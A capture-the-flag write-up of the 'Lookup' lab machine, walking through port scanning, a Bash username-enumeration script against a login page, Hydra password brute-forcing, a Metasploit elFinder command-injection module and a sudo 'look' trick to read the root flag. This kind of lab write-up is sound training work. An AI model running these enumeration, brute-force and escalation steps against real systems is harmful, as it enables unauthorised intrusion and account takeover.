---
title: "Lookup Write-up"
date: 2024-11-23
draft: false
---

### **Lookup Write-up**  
**by Khaled Alrowaishan**  

Welcome to the Lookup adventure! This machine is packed with fun challenges to test your enumeration and exploitation skills. Along the way, we’ll tackle real-world vulnerabilities, crack some passwords, and maybe even mess with file permissions. Ready to dig in? Let’s hack like it’s 1999—minus the Y2K bug drama.

---

## **Port Scanning**
Let’s start by asking the machine, “What’s your secret?” using some port scanning magic.

##### **Masscan**
Think of this as the Usain Bolt of port scanners—it’s fast but doesn’t dive deep.

```bash
sudo masscan -p 1-65535 --interface tun0 --rate 250 10.10.247.158
```
Result: Found a few interesting ports.

##### **Nmap**
Now, let’s bring in Sherlock Holmes to investigate those ports.

```bash
sudo nmap -sC -sV -sS -O -A -oN scanned.txt -p22,80 --open --min-rate=1000 10.10.247.158

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 02:25 EST
Nmap scan report for lookup.thm (10.10.247.158)
Host is up (0.33s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Result: Found services running on the ports. Hmm... things are getting interesting.

Tip: If Masscan and Nmap were a buddy cop duo, Masscan would yell, “The thief is in that building!” and Nmap would say, “Let’s search every room for clues.”

## **Information Gathering and Enumeration**

Time to spy on the target—legally, of course!

###### **WhatWeb**
This tool is like peeking into someone’s tech shopping cart.

```bash
whatweb http://lookup.thm

http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.247.158], PasswordField[password], Title[Login Page]
Nothing important, so I’ll use some techniques.
```
#### **Directory Enumeration**
Here’s where the real detective work begins.

##### **Gobuster**
```bash
gobuster dir --url http://lookup.thm/ --wordlist=/usr/share/dirb/wordlists/common.txt

/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 719]
/server-status        (Status: 403) [Size: 275]
```
We used Gobuster to knock on every door (URL) and see which ones open.

#### **Custom User Enumeration**

No luck with regular tools? DIY time! I wrote a simple Bash script to list potential usernames.

##### **Simple Script**

```bash
#!/bin/bash
# Define the target URL
url="http://lookup.thm/login.php"
# Define the file path containing usernames
file_path="/usr/share/seclists/Usernames/Names/names.txt"
# Check if the file exists
if [[ ! -f "$file_path" ]]; then
    echo "Error: The file $file_path does not exist."
    exit 1
fi
# Loop through each username in the wordlist
while IFS= read -r username; do
    # Skip empty lines
    if [[ -z "$username" ]]; then
        continue
    fi
    # Send POST request with fixed password
    response=$(curl -s -X POST "$url" -d "username=$username&password=password")
    # Check for specific strings in the response
    if echo "$response" | grep -q "Wrong password"; then
        echo "Username found: $username"
    elif echo "$response" | grep -q "wrong username"; then
        continue  # Silent continuation for wrong usernames
    fi
done < "$file_path"
```
After running the script, I found the users.

#### **Password Brute-Forcing**

Used Hydra to brute force the login for identified users.

```bash
hydra -l jose -P ~/Desktop/CTF/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" [80][http-post-form] host: lookup.thm login: jose password: *********
```
## **Exploitation**

Now comes the fun part—breaking in!

CMS Vulnerability

Found a CMS called ElFinder during reconnaissance.
Used Searchsploit to locate an exploit script.

```bash
searchsploit elfinder
```
Exploited the CMS using Metasploit to gain a foothold.

```bash
search elFinder
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```
### **Privilege Escalation**

Time to go from user to king of the castle!

##### **Sudo Permissions**

Found an interesting command allowed by sudo:

```bash
sudo -l
```
##### **Exploitation**

Discovered a way to use look for privilege escalation:

```bash
LFILE=/root/root.txt sudo look '' "$LFILE"
```

Got the root flag!!!

## **Conclusion**
The Lookup machine was a fantastic challenge, covering everything from enumeration to privilege escalation. By combining automated tools and manual creativity, we uncovered vulnerabilities, exploited them, and claimed the prized root flag.
